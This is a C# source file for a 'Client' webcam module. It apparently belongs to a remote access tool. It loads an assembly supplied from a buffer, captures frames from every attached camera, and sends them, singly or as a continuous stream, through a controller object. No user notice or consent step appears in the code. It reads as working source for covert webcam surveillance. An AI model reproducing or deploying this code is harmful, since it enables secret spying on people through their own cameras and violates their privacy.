using WebEye;
using System.Drawing;
using System.Threading;
using System;
using System.Reflection;
namespace Client
{
    class WebCam
    {
        public static bool StreamImages = false;
        public WebCam()
        {
            byte[] assemblyBuffer = Program.A.GetAssembly(2);
            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
            {
                return Assembly.Load(assemblyBuffer);
            };
        }
        public Bitmap GrayScale(Bitmap Bmp)
        {
            int rgb;
            System.Drawing.Color c;

            for (int y = 0; y < Bmp.Height; y++)
                for (int x = 0; x < Bmp.Width; x++)
                {
                    c = Bmp.GetPixel(x, y);
                    rgb = (int)((c.R + c.G + c.B) / 3);
                    Bmp.SetPixel(x, y, System.Drawing.Color.FromArgb(rgb, rgb, rgb));
                }
            return Bmp;
        }
        public void SendPicture()
        {
            WebEye.WebCameraControl webCameraControl1 = new WebCameraControl();
            foreach (WebCameraId camera in webCameraControl1.GetVideoCaptureDevices())
            {
                webCameraControl1.StartCapture(camera);
                Thread.Sleep(200);
                Bitmap test = GrayScale(new Bitmap(webCameraControl1.GetCurrentImage()));
                Program.A.SetMyWebCam(ScreenCapture.imageToByteArray(test));

            }
            if (webCameraControl1.IsCapturing)
            {
                webCameraControl1.StopCapture();
            }
            webCameraControl1.Dispose();

        }
        public void SendStreamImages()
        {
            WebEye.WebCameraControl webCameraControl1 = new WebCameraControl();
            foreach (WebCameraId camera in webCameraControl1.GetVideoCaptureDevices())
            {
                webCameraControl1.StartCapture(camera);
                Thread.Sleep(200);
                while (StreamImages)
                {
                     Program.A.SetMyWebCam(ScreenCapture.imageToByteArray(GrayScale(new Bitmap(webCameraControl1.GetCurrentImage()))));
                     Thread.Sleep(200);
                }

            }
            if (webCameraControl1.IsCapturing)
            {
                webCameraControl1.StopCapture();
            }
            webCameraControl1.Dispose();
        }
    }
}
